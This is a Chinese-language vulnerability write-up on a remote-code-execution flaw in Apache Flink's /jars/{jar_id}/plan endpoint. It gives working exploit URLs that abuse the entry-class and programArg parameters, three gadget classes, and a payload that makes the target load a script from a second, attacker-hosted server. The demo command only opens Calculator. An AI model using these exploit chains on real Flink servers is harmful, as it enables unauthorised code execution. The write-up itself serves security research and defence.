## 0x00 漏洞原理

此前，HackOne披露了一个由jarij发现的[Apache Flink
RCE漏洞](https://hackerone.com/reports/1418891)，该漏洞中揭露了一个Apache
Flink新的攻击面，下面针对该风险进行分析：  
jarij在实际攻击场景下，被限制访问了Flink的部分敏感接口，所以传统的上传Jar方式RCE无法使用。在通过对可访问的接口进行安全分析后，jarij发现了`/jars/{jar_id}/plan`这个接口，根据官方文档描述，该接口会返回jar包中任务计划的数据流。并且，该接口存在一个可选参数，`entry-class`，支持覆盖原有jar包中的入口类。同时还支持通过`programArg`参数传递调用入口类时的参数。  
所以，我们只要在jdk内部或classpath中，找到一个类，符合Flink入口类的要求，即拥有静态公开的main方法，并且可通过可控参数实现恶意功能，即可完成攻击。  
![image](https://image.3001.net/images/20230420/1681984682_64410caa8f0d51b600037.png!small)

## 0x01 漏洞复现

文章作者寻找到了这么一个类`com.sun.tools.script.shell.Main`，Java中的jrunscript命令就是依赖这个类实现的，可以通过参数`-e`，直接执行js代码。  
搭建Flink测试环境，由于该漏洞是在Standalonesession
Daemon中执行的，所以jar包是否能够成功running并不影响漏洞利用，这里上传任意jar包即可，上传成功后可通过访问`/jars`接口获取到`jarid`：

![image](https://image.3001.net/images/20230420/1681984859_64410d5b5beb0061c0048.png!small)  
`com.sun.tools.script.shell.Main`支持从外部远程加载脚本执行，编写一个恶意脚本并托管到Web服务下备用，脚本内容如下：

    
    
    java.lang.Runtime.getRuntime().exec("open -a Calculator")
    

拼接相关参数即可执行命令：

    
    
    http://www.test.com:8081/jars/c4314af3-3b4f-4240-84b3-cbca1da50631_yaml-payload.jar/plan?entry-class=com.sun.tools.script.shell.Main&programArg=-e,load(%22http://www.test.com:8888/a.js%22)&ampparallelism=1
    

![image](https://image.3001.net/images/20230420/1681984950_64410db6d32ecea83deba.png!small)

需要注意的是，通过`com.sun.tools.script.shell.Main`执行命令，会使Standalonesession
Daemon异常退出，Web服务会直接停止，需要重启Flink。

## 0x02 环境差异&新利用类探索

由于Flink默认启动脚本中启动参数的原因，在JDK8环境中，tools.jar所在的路径没有被包含在classpath中，这就导致在漏洞利用时，会提示找不到`com.sun.tools.script.shell.Main`这个类：  
![image](https://image.3001.net/images/20230420/1681984986_64410dda96e1935def5ed.png!small)  
而JDK8以上，由于改用了module机制，内部类都是通过jmod的方式加载，所以`com.sun.tools.script.shell.Main`可以被加载到jvm中。  
那么有没有其他利用类，可以在JDK8的环境下成功利用呢？笔者经过一番查找，找到了一个存在于nashorn.jar中的类`jdk.nashorn.tools.Shell`，它是可以在JDK8环境中被默认加载的。但是由于其不支持远程加载js文件，所以利用时需要上传一个恶意的js文件，不能仅依靠传参执行任意代码，需要结合文件上传等其他漏洞进行利用。  
另外，这个类利用后，不会导致Standalonesession
Daemon异常退出，影响相对来说更小一些，构造相关参数如下，其中programArg需要指定恶意js脚本的本地路径，即可利用成功：

    
    
    http://www.test.com:8081/jars/9a78d73c-5587-468f-a5f9-2bd0ea11dabf_FlinkJavaDemo.jar/plan?entry-class=jdk.nashorn.tools.Shell&programArg=/Users/1z3r0/tmp/flink_test/a.js&ampparallelism=1
    

![image](https://image.3001.net/images/20230420/1681985057_64410e215c1b67012feef.png!small)

但是，这要求目标服务器能够访问到远程的恶意文件，在实际攻防场景中仍存在一定的限制，于是笔者继续搜索，终于在flink-table-runtime-1.15.3.jar中，发现了一个类org.codehaus.commons.compiler.samples.ScriptDemo，既满足利用条件，还不需要访问远程文件。构造链接如下：

    
    
    http://www.test.com:8081/jars/fd07e3d3-0ed3-4645-94f1-b35e4402ceb7_yaml-payload.jar/plan?entry-class=org.codehaus.commons.compiler.samples.ScriptDemo&programArg=try{java.lang.Runtime.getRuntime().exec("open+-a+calculator")%3b}catch+(java.io.IOException+e){}&ampparallelism=1
    

![image](https://image.3001.net/images/20230420/1681985138_64410e7255fbcb074a6f6.jpg!small)

## 0x03 总结

本次`/jars/{jar_id}/plan`接口的新攻击面，和此前通过上传恶意jar包进行任意代码执行的利用方式一样，都属于对原有功能的滥用，导致的安全风险。但仍存在一些差异。  
首先，就是恶意代码的执行位置不同；Flink作为一个分布式的流处理框架，在实际环境中，Taskexecutor
Daemon和Standalonesession
Daemon大多是分别独立部署的，这就导致通过这两种方式拿到的机器是不一样的。上传的恶意Jar包会在Taskexecutor
Daemon中执行，而本次的plan功能，会在Standalonesession
Daemon中执行。在此前实际利用攻防中，也遇到过Flink没有可用的Task Slots的情况，如下图这样：  
![image](https://image.3001.net/images/20230420/1681985180_64410e9ce5acf55f01774.png!small)  
这种场景下，通过上传恶意Jar包的利用方式，会因为无法提交Jobs导致利用失败，而通过plan功能利用却不会有这种限制。  
其次，是对上传jar包的要求，上传恶意Jar包利用，需要Jar包可以正常运行，所以需要编写符合Flink
Job规范的Jar包。而通过plan功能利用，由于实际执行的是JDK或Classpath中的类，所以对Jar包没有特殊要求，上传任意Jar包或者直接利用现有的Jar包即可。  
最后，就是对利用环境的要求不同，基于目前发现的可利用类，plan功能在JDK8以上可以直接利用，但是需要目标服务器访问恶意服务器。JDK8及以下，需要能够将恶意文件上传到服务器本地，相对来说利用条件比较苛刻。而上传恶意Jar包的利用方式，只需要有可用的Task
Slots并能够上传Jar包即可。

